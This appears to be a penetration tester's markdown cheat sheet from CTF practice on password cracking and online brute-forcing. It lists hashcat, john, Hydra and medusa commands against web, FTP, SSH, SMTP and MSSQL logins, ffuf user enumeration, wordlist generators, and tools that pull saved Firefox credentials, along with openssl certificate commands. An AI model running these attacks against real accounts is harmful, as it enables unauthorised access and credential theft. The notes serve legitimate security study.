

## Basics
- cracking: from hash
- guessing: from dictionary (loud)
- dump = leaks of passwords/hash
- Combine
  - cat file1 file2 > file3
  - sort fil3 | uniq u > cleaned

## Hashcat
- Identify hash
  - hashid -m HASH
  - hashidentifier

- wordlist
  - hashcat target /path/to/word/list
  - hashcat --example-hash
- hashcat
  - a 0 = dictionary attack
    - dictionary = list | brute-force = guessing
  - -m 0 = type of hash
  - -a 3 = brute force method
  - ?d = use digit for generating
  - TOTAL_CHARACTERS = generate list

- [Crackstation](https://crackstation.net/)
  
## John
- Using rules
  - john --wordlist=existing_list --rules=pick_one --stdout
  - --format=ENCRYPTION
  - adding rule
    - conf file: [rule_name] Az"[0-9]" ^[!@#$]

- zip2john file.zip > zip.hasj
- ssh2john key > key.hash


## Hydra
- hydra -l username -P wordlist.txt server service
- hydra -l username -P wordlist.txt service://server (hydra -l -u $target smb -V -f)
- -d = debug
- -v = verbose
- -V = show attempts
  - vV = more info
- -f = terminate if found
- -s = port to connect
- -t = number threadlos
- hydra MODULE -U

- web
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
    - F:failing strings
    - S:sucessfull strings
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
  
  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* '/login.aspx:BODY_PARAMETER_WITH_PASSWORD:S=logout.php' -f
  
    - Request: *HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy*
    - IP/URL http-get-form | http-post-form "/login-get/index.php:[BODY_CONTENT]&username=^USER^&PASSWORD=^PASS:S=logout.php" -f
    - for post: whole POST BODY
      - S= [message_for_success]
      - F= [message_for_failed]
      - -V Verbose
      - -f = stop attack after finding
      - -L = List of usernames
      - -s=302 ==> sucessfull redirect

```
hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f

hydra -l milesdyson -P log1.txt $target http-post-form '/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.'\n
```

- FTP
  - hydra -l [USERNAME] -P password.lst ftp://IP:PORT

- SMPT
  - -l email@address.com -P [Password_List] smtp://IP -v

- SSH
  - -L [USER_LIST] -P [PASS_LIST] ssh://IP -v

- MSSQL
  -  hydra -L user.txt –P pass.txt $TARGET mssql

- Default Usernames:
```
root
admin
```

# Medusa
- medusa -U user -P pass -h $TARGET -M ftp

## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## Brutespray
- Toll that uses result from nmap scan .xml
- [Information here](https://github.com/x90skysn3k/brutespray)

## Creating Wordlists
- cewl URL
  - -w = output
  - -d 5 = depth
  - -m 5 = minimum
  
- username_gennerator.py

- crunch
  - combination of characters
  - crunch 2 2 123456abcd -o output
  - -t startpassword[symbol1][symbol2]
    - @ lower case
    - , upercase
    - % numeric
    - ^ special

- cupp
  - based on information of the target, birthdate, pet, etc
  - https://github.com/Mebus/cupp.git

## Zip files
- fcrackzip
  - -D = dictionary
  - -u = only correct password

## Mozillas files
- Files
  - .db
  - logins.json
  - cookies.sqlite
- https://github.com/lclevy/firepwd.git
- https://github.com/unode/firefox_decrypt.git
- msfconsole:
  -  use post/multi/gather/firefox_creds = extract files

## SSL
- Create certificates, pub.keys, priv.keys
- Verify priv.key to certificate
  - openssl pkey -in INPUT.key -pubout

- Verify pub.key from certificate
  - openssl x509 -in ca.crt -pubkey -noout
  
  - Compare
    - openssl x509 -in ca.crt -pubkey -noout | md5sum; \
openssl pkey -in ca.key -pubout | md5sum

- Generate certificate
  - openssl genrsa -out client.key 4096
  - openssl req -new -key client.key -out client.src
  
- Sign certificate with key
    - openssl req -x509 -new -nodes -key ca.key -sha256 -days 1024 -out my.pem
    - openssl req -x509 -new -nodes -key KEY.key -sha256 -days 1024 -out MyCert.pem
  - pkcs12 = combination(.key,.cer)
    - openssl pkcs12 -export -inkey client.key -in client.cert -out client.p12
    - openssl pkcs12 -export -in 0xdf.pem -inkey ca.key -out client.p12
  - check pkcs12
    - openssl pkcs12 -info -in client.p12

- Verify certificates
  - openssl verify -verbose -CAfile ca.crt client.cer
  
- pfx file: Personal Information Exchange = store/transport senstive information 
- Extract key
  - openssl pkcs12 -in originalfile.pfx -nocerts -out key.pem -nodes
- Extrackt certificate
  - openssl pkcs12 -in originalfile.pfx -nokeys -out cert.pem